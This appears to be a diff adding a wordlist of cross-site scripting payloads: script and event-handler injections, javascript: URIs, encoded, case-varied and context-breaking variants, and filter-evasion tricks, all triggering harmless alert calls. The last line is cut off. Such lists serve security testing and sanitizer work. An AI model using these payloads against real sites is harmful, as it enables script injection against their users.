@@ -1,0 +1,60 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)
+<script>prompt(8)</script>
+<script>confirm(1)</script>
+<img src=1 href=1 onerror="javascript:alert(1)">
+<svg><script>alert(1)</script></svg>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video><source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src="x:gif" onerror="window['al\u0065rt'](0)">
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//>
+">'><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+"><svg/onload=alert(/XSS/)>
+'-alert(1)-'
+"-alert(1)-"
+`;alert(1);//
+<div onmouseover="alert(1)">test</div>
+<p onclick="alert(1)">click</p>
+<button onmousedown="alert(1)">press</button>
+<form onsubmit="alert(1)"><input type=submit></form>
+<input type="text" onchange="alert(1)">
+<select onchange="alert(1)"><option>test</option></select>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/)</script>
+<script>alert`1`</script>
+<script>(alert)(1)</script>
+<script>a=alert,a(1)</script>
+<script>[].constructor.constructor("alert(1)")()</script>
+';alert(1);//
+";alert(1);//
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+<svg><animatetransform onbegin=alert(1)>
+<input type=image src o
